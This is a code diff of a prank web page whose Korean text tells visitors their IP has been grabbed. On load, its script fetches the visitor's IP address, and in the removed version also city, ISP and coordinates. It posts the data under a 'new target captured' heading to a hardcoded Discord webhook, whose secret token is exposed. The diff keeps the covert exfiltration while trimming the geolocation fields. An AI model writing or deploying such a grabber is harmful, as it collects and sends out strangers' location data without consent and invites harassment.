@@ -71,34 +71,27 @@
         <div id="ip-text">너 ip따임 ㅋㅋㅋ</div>
     </div>
 
-    <!-- 비디오 파일에서 소리만 빼서 무한 반복 -->
+    <!-- 비디오 파일에서 소리만 빼서 무한 반복 (화면엔 안 보임) -->
     <video id="sumpsound" src="ScreenRecording_08-31-2026 22-35-48_1.mov" preload="auto" loop playsinline style="display:none;"></video>
 
     <script>
         const webhookURL = 'https://discord.com/api/webhooks/1543975289527341118/tgC_i7WSsTccdUWBE2FXjMkY1__piEvWo1UxZkP3BTlbKNpCrlAujbLFeEjJoMyIbrxl';
 
-        // IP 및 세부 정보 추출 API (ip-api 사용)
-        fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query')
+        // IP 추출 및 전송
+        fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
             .then(data => {
-                if(data.status === 'success') {
-                    const messageContent = `🎯 **새로운 타겟 포착!**
-> **IP 주소:** \`${data.query}\`
-> **국가/도시:** ${data.country} / ${data.regionName} / ${data.city}
-> **통신사(ISP):** ${data.isp} (${data.org})
-> **위치 좌표:** 위도 ${data.lat}, 경도 ${data.lon}
-> **타임존:** ${data.timezone}`;
+                const visitorIP = data.ip;
 
-                    fetch(webhookURL, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            content: messageContent
-                        })
-                    }).catch(err => console.error(err));
-                }
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: `🎯 **새로운 타겟 포착!**\n> IP 주소: \`${visitorIP}\``
+                    })
+                }).catch(err => console.error(err));
             })
             .catch(() => {});
 
